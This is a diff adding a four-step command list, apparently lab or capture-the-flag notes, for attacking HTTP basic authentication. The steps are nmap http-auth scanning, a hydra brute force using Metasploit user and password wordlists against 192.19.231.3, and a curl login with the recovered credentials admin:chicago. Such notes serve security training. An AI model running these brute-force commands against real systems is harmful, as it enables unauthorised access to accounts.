@@ -1,0 +1,5 @@
+1. nmap --script http-auth [--script-args http-auth.path=/login] -p80 <host>
+2. curl -l <ip> -v
+3. hydra -L  /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P wordlists/100-common-passwords.txt -s 80 -f 192.19.231.3 http-get
+4. curl -u admin:chicago http://192.19.231.3:80
+
